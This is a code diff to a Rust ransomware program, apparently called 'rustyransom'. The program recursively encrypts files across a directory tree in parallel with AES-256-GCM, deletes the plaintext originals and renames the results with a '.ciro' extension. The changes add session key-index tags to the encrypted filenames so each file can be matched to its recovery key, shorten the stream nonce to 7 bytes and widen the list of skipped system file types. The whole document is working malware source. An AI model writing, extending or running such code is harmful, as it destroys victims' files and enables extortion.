@@ -21,12 +21,12 @@
 //! ## Encryption Process
 //!
 //! 1. Generate a unique 12-byte nonce for each file using `OsRng` (cryptographically secure)
-//! 2. Initialize AES-GCM stream encryptor with the first 8 bytes of the nonce
-//! 3. Write the 8-byte nonce to the output file (needed for decryption)
+//! 2. Initialize AES-GCM stream encryptor with the first 7 bytes of the nonce
+//! 3. Write the 7-byte nonce to the output file (needed for decryption)
 //! 4. Stream-encrypt the file in 4KB chunks
 //! 5. Finalize encryption with `encrypt_last()` (handles padding/authentication)
 //! 6. Delete the original plaintext file
-//! 7. Append `.ciro` extension to the encrypted file
+//! 7. Append `.ciro` extension with key index to the encrypted file
 //!
 //! ## Error Handling
 //!
@@ -42,7 +42,7 @@ use std::{
     env,
     fs::{File, read_dir, remove_file},
     io::{BufReader, Read, Write},
-    path::{Path, PathBuf},
+    path::{Path, PathBuf}
 };
 
 /// Determines if a file should be encrypted based on extension blacklist.
@@ -90,6 +90,13 @@ fn should_encrypt(path: &Path) -> bool {
         "sys",  // Windows system files
         "so",   // Linux shared libraries
         "ko",   // Linux kernel modules
+        "service", // Linux systemd service files
+        "desktop", // Linux desktop files
+        "conf", // configuration files
+        "cfg", // configuration files
+        "ini", // configuration files
+        "gpg", // gpg files
+        
     ];
 
     // Get extension, return false if no extension (protect binaries like "rustyransom")
@@ -157,15 +164,15 @@ fn is_self_executable(path: &Path) -> bool {
 /// # Encryption Scheme
 ///
 /// - **Algorithm**: AES-256-GCM (Galois/Counter Mode with AEAD)
-/// - **Nonce**: 12-byte cryptographically secure random nonce (first 8 bytes used for stream mode)
+/// - **Nonce**: 12-byte cryptographically secure random nonce (first 7 bytes used for stream mode)
 /// - **Chunk Size**: 4KB for streaming (prevents memory exhaustion)
-/// - **Output Format**: `[8-byte nonce][encrypted chunks][final tag]`
+/// - **Output Format**: `[7-byte nonce][encrypted chunks][final tag]`
 ///
 /// # Process
 ///
 /// 1. Generate a 12-byte nonce using `OsRng` (hardware RNG on modern systems)
-/// 2. Initialize stream encryptor with first 8 bytes of nonce (AES-GCM stream mode requirement)
-/// 3. Write the 8-byte nonce to the new file (needed for decryption later)
+/// 2. Initialize stream encryptor with first 7 bytes of nonce (AES-GCM stream mode requirement)
+/// 3. Write the 7-byte nonce to the new file (needed for decryption later)
 /// 4. Read the input file in 4KB chunks and encrypt each chunk
 /// 5. Finalize with `encrypt_last()` to complete authentication tag
 /// 6. Delete the original plaintext file
@@ -174,6 +181,7 @@ fn is_self_executable(path: &Path) -> bool {
 ///
 /// * `path` - Path to the plaintext file to encrypt
 /// * `cipher` - AES-256-GCM cipher instance (cloned for thread-safety in parallel execution)
+/// * `key_count` - Session key index for tagging encrypted files
 ///
 /// # Returns
 ///
@@ -182,9 +190,12 @@ fn is_self_executable(path: &Path) -> bool {
 ///
 /// # File Naming
 ///
-/// The encrypted file is created with a `.ciro` extension:
-/// - `document.txt` → `document.txt.ciro`
-/// - `file` (no extension) → `file.ciro`
+/// The encrypted file is created with a `.ciro` extension and key index tag:
+/// - `document.txt` → `document_0.txt.ciro` (if key_count=0)
+/// - `photo.jpg` → `photo_1.jpg.ciro` (if key_count=1)
+/// - `file` (no extension) → `file_2.ciro` (if key_count=2)
+///
+/// This allows mapping which recovery key can decrypt which files.
 ///
 /// # Errors
 ///
@@ -198,13 +209,12 @@ fn is_self_executable(path: &Path) -> bool {
 /// - **Nonce Uniqueness**: Each file gets a unique nonce. AES-GCM security requires nonces never repeat.
 /// - **Authentication**: GCM mode provides built-in authentication tag (detects tampering).
 /// - **Memory Safety**: Only 4KB held in memory at once, suitable for multi-GB files.
-fn encrypt_file(path: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> {
+fn encrypt_file(path: PathBuf, cipher: Aes256Gcm, key_count: usize) -> Result<(), std::io::Error> {
     // Generate cryptographically secure random nonce (12 bytes for AES-GCM)
     let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
 
-    // Stream encryptor requires 8-byte nonce (not the full 12-byte GCM nonce)
-    // Using first 8 bytes as counter initialization
-    let nonce_stream = GenericArray::from_slice(&nonce[0..8]);
+    // Stream encryptor requires 7-byte nonce (not the full 12-byte GCM nonce)
+    let nonce_stream = GenericArray::from_slice(&nonce[0..7]);
     let mut encryptor = EncryptorBE32::from_aead(cipher, nonce_stream);
 
     let file = File::open(&path)?;
@@ -214,15 +224,23 @@ fn encrypt_file(path: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> 
 
     // Construct output filename with .ciro extension
     let mut new_path = path.clone();
-    if let Some(ext) = new_path.extension() {
-        // File has extension: document.txt → document.txt.ciro
-        new_path.set_extension(format!("{}.ciro", ext.to_string_lossy()));
-    } else {
-        // No extension: file → file.ciro
-        new_path.set_extension("ciro");
-    }
-    let mut new_file = File::create(new_path)?;
+    let file_stem = new_path.file_stem()
+        .ok_or_else(|| std::io::Error::other("File has no stem"))?
+        .to_string_lossy()
+        .to_string();
+    
+    let original_extension = new_path.extension()
+        .map(|e| e.to_string_lossy().to_string());
+    
+    // Build filename: stem_keyindex.originalext.ciro or stem_keyindex.ciro
+    let new_filename = match original_extension {
+        Some(ext) => format!("{}_{}.{}.ciro", file_stem, key_count, ext),
+        None => format!("{}_{}.ciro", file_stem, key_count),
+    };
 
+    new_path.set_file_name(new_filename);
+    let mut new_file = File::create(new_path)?;
+    
     // Write nonce at beginning of encrypted file (required for decryption)
     new_file.write_all(nonce_stream)?;
 
@@ -235,7 +253,7 @@ fn encrypt_file(path: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> 
 
         let ciphertext = encryptor
             .encrypt_next(&buffer[0..bytes_read])
-            .map_err(|_| std::io::Error::other("Encyption error"))?;
+            .map_err(|_| std::io::Error::other("Encryption error"))?;
 
         new_file.write_all(&ciphertext)?;
     }
@@ -279,6 +297,7 @@ fn encrypt_file(path: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> 
 ///
 /// * `dir` - Root directory to start encryption from
 /// * `cipher` - AES-256-GCM cipher instance (cloned for each parallel worker)
+/// * `key_count` - Session key index for tagging encrypted files
 ///
 /// # Panics
 ///
@@ -300,9 +319,10 @@ fn encrypt_file(path: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> 
 /// ```ignore
 /// use aes_gcm::{Aes256Gcm, aead::OsRng};
 /// let cipher = Aes256Gcm::new(&Aes256Gcm::generate_key(&mut OsRng));
-/// encrypt_files(PathBuf::from("/home/user/documents"), cipher);
+/// let key_count = 0; // First session
+/// encrypt_files(PathBuf::from("/home/user/documents"), cipher, key_count);
 /// ```
-pub fn encrypt_files(dir: PathBuf, cipher: Aes256Gcm) {
+pub fn encrypt_files(dir: PathBuf, cipher: Aes256Gcm, key_count: usize) {
     if let Ok(entries) = read_dir(dir) {
         // Parallel iteration over directory entries using Rayon
         entries.par_bridge().into_par_iter().for_each(|entry| {
@@ -316,9 +336,9 @@ pub fn encrypt_files(dir: PathBuf, cipher: Aes256Gcm) {
 
                 if path.is_dir() {
                     // Recurse into subdirectories (each worker handles its own subtree)
-                    encrypt_files(path, cipher.clone());
+                    encrypt_files(path, cipher.clone(), key_count);
                 } else if should_encrypt(&path)
-                    && let Err(e) = encrypt_file(path, cipher.clone())
+                    && let Err(e) = encrypt_file(path, cipher.clone(), key_count)
                 {
                     // Log error but continue with other files (error resilience)
                     println!("Error: {e}");
